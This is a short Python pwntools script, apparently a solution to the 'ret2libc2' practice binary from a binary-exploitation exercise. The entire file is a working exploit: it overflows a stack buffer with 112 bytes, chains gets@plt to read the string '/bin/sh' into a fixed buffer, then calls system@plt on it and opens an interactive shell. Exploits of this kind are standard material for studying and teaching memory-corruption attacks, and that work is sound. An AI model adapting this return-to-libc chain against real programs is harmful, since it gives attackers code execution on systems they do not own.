#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright Â© 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

##!/usr/bin/env python
from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x08048460
system_plt = 0x08048490
# pop_ebx = 0x0804843d
pop_ebx = 0x0804872f
buf2 = 0x804a080
payload = flat(
            ['a' * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2]
        )
sh.sendline(payload)
sh.sendline('/bin/sh')
sh.interactive()

